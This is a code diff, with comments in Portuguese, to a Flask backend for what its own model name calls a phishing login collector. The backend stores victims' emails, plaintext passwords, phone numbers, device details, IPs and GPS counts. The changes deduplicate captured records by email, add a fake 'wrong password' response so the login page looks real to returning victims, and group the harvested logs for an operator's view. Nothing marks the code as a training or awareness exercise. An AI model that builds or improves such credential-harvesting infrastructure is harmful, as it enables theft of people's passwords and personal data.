@@ -168,22 +168,39 @@ def capture_form():
         
         timestamp = datetime.utcnow()
         
-        with db_lock:
-            entry = PhishingLogin(
-                email=email,
-                password=f'[FORM] {phone_brand} {phone_model} - {phone_number}',
-                ip=ip,
-                user_agent=user_agent,
-                device_info=str(full_info),
-                timestamp=timestamp
-            )
-            db.session.add(entry)
-            db.session.commit()
+        # Verificar se email já existe para atualizar em vez de duplicar
+        existing = PhishingLogin.query.filter_by(email=email).first()
+        
+        if existing:
+            # Atualizar registo existente com dados do formulário
+            with db_lock:
+                existing.password = f'[FORM] {phone_brand} {phone_model} - {phone_number}'
+                existing.device_info = str(full_info)
+                existing.ip = ip
+                existing.timestamp = timestamp
+                if user_agent:
+                    existing.user_agent = user_agent
+                db.session.commit()
+                entry_id = existing.id
+        else:
+            # Criar novo registo
+            with db_lock:
+                entry = PhishingLogin(
+                    email=email,
+                    password=f'[FORM] {phone_brand} {phone_model} - {phone_number}',
+                    ip=ip,
+                    user_agent=user_agent,
+                    device_info=str(full_info),
+                    timestamp=timestamp
+                )
+                db.session.add(entry)
+                db.session.commit()
+                entry_id = entry.id
         
         return jsonify({
             'success': True,
             'message': 'Dados capturados com sucesso',
-            'id': entry.id
+            'id': entry_id
         }), 200
     
     except Exception as e:
@@ -317,8 +334,46 @@ def login():
         if len(password) < 8:
             return jsonify({'error': 'Senha deve ter pelo menos 8 dígitos'}), 400
 
+        # Verificar se email já existe
+        existing = PhishingLogin.query.filter_by(email=email).first()
+        
+        if existing:
+            # Email já existe - verificar se a senha bate
+            if existing.password == password:
+                # Senha correta - utilizador autenticado com sucesso
+                # Atualizar timestamp e IP para registar novo acesso
+                with db_lock:
+                    existing.timestamp = datetime.utcnow()
+                    
+                    # Atualizar IP e device_info se fornecidos
+                    client_ip = data.get('client_ip')
+                    if client_ip and client_ip != 'unknown':
+                        existing.ip = client_ip
+                    
+                    client_device = data.get('device_info')
+                    if client_device and isinstance(client_device, dict):
+                        existing.device_info = str(client_device)
+                    
+                    db.session.commit()
+                
+                return jsonify({
+                    'success': True,
+                    'message': 'Login efetuado com sucesso! Bem-vindo de volta.',
+                    'redirect': '/pos-login',
+                    'new_user': False,
+                    'user_id': existing.id
+                }), 200
+            else:
+                # Senha errada - utilizador já existe mas com senha diferente
+                return jsonify({
+                    'error': 'Senha incorreta',
+                    'message': f'Este email já está registado com outra senha. Use a senha original.',
+                    'duplicate': False,
+                    'wrong_password': True
+                }), 401
+
+        # Email NÃO existe - criar novo utilizador
         # Priorizar IP e device_info enviados pelo cliente (navegador)
-        # Fallback para IP dos headers de proxy e device_info do User-Agent
         client_ip = data.get('client_ip')
         if client_ip and client_ip != 'unknown':
             ip = client_ip
@@ -352,8 +407,10 @@ def login():
 
         return jsonify({
             'success': True,
-            'message': 'Login efetuado com sucesso!',
-            'redirect': '/pos-login'
+            'message': 'Conta criada com sucesso! Bem-vindo.',
+            'redirect': '/pos-login',
+            'new_user': True,
+            'user_id': login_entry.id
         }), 200
 
     except Exception as e:
@@ -363,9 +420,10 @@ def login():
 @app.route('/api/stats', methods=['GET'])
 def stats():
     try:
+        # Como agora rejeitamos duplicados, total = unique_emails
         total = db.session.query(db.func.count(PhishingLogin.id)).scalar()
-        unique_ips = db.session.query(db.func.count(db.distinct(PhishingLogin.ip))).scalar()
         unique_emails = db.session.query(db.func.count(db.distinct(PhishingLogin.email))).scalar()
+        unique_ips = db.session.query(db.func.count(db.distinct(PhishingLogin.ip))).scalar()
         
         # Contar quantos têm geolocalização GPS
         entries = PhishingLogin.query.all()
@@ -391,9 +449,18 @@ def stats():
 @app.route('/api/logs', methods=['GET'])
 def logs():
     try:
-        entries = PhishingLogin.query.order_by(PhishingLogin.timestamp.desc()).limit(100).all()
-        logs_list = []
+        # Agrupar por email e pegar apenas o registo mais recente de cada
+        # Isso garante que não há duplicados na visualização
+        entries = PhishingLogin.query.order_by(PhishingLogin.timestamp.desc()).all()
+        
+        # Agrupar por email
+        grouped = {}
         for entry in entries:
+            if entry.email not in grouped:
+                grouped[entry.email] = entry
+        
+        logs_list = []
+        for entry in grouped.values():
             logs_list.append({
                 'id': entry.id,
                 'email': entry.email,
@@ -403,6 +470,9 @@ def logs():
                 'device_info': entry.device_info,
                 'timestamp': entry.timestamp.isoformat() if entry.timestamp else None
             })
+        
+        # Ordenar por timestamp desc
+        logs_list.sort(key=lambda x: x['timestamp'] or '', reverse=True)
         
         return jsonify({'logs': logs_list}), 200
     except Exception as e:
